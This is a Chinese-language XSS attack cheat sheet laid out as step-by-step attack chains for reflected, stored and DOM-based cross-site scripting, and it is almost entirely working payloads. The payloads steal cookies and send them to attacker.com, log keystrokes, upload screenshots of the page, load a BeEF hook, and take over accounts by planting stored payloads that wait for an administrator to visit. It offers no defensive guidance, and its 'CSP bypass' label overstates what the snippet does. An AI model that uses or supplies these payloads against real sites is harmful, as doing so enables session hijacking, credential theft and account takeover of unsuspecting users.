# XSS攻击链

## 反射型XSS攻击链

### 基础利用

```
1. 探测XSS
   <script>alert(1)</script>

2. 绕过过滤
   <img src=x onerror=alert(1)>
   <svg onload=alert(1)>

3. 获取Cookie
   <script>new Image().src="http://attacker.com/steal?c="+document.cookie;</script>

4. 窃取数据
   http://attacker.com/steal?c=PHPSESSID=xxx
```

---

## 存储型XSS攻击链

### 长期钓鱼

```
1. 寻找存储点
   - 评论区
   - 用户资料
   - 帖子内容

2. 植入Payload
   <script>fetch('http://attacker.com/log?c='+document.cookie)</script>

3. 等待管理员访问
   - 管理后台
   - 审核页面

4. 账户接管
   - 使用窃取的Cookie登录
```

---

## DOM型XSS攻击链

### 前端利用

```
1. 探测DOM sinks
   - document.location
   - document.URL
   - eval()
   - innerHTML

2. 构造Payload
   <img src=x onerror=location.href='http://attacker.com?c='+document.cookie>

3. 利用
   - 重定向
   - 窃取数据
```

---

## 完整攻击链示例

### 1. 基础Cookie窃取

```html
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>
```

### 2. 键盘记录

```html
<script>
document.onkeypress=function(e){
  new Image().src="http://attacker.com/log?k="+e.key;
}
</script>
```

### 3. 屏幕截图

```html
<script>
html2canvas(document.body).then(canvas => {
  fetch('http://attacker.com/upload', {
    method: 'POST',
    body: canvas.toDataURL()
  });
});
</script>
```

### 4. BeEF钩子

```html
<script src="http://attacker.com:3000/hook.js"></script>
```

### 5. 绕过CSP + 持久化

```html
<script>
if(window.name !== 'xss'){
  window.name = 'xss';
  fetch('http://attacker.com/persist?d='+document.cookie);
}
</script>
```

---

## 攻击链速查

| 目标 | Payload | 说明 |
|------|---------|------|
| 弹窗测试 | `<script>alert(1)</script>` | 基础测试 |
| Cookie窃取 | `new Image().src="http://attacker?c="+document.cookie` | 会话劫持 |
| 键盘记录 | `document.onkeypress=function(e){...}` | 输入窃取 |
| 重定向 | `location.href='http://attacker'` | 钓鱼 |
| 持久化 | 存储型XSS | 长期控制 |
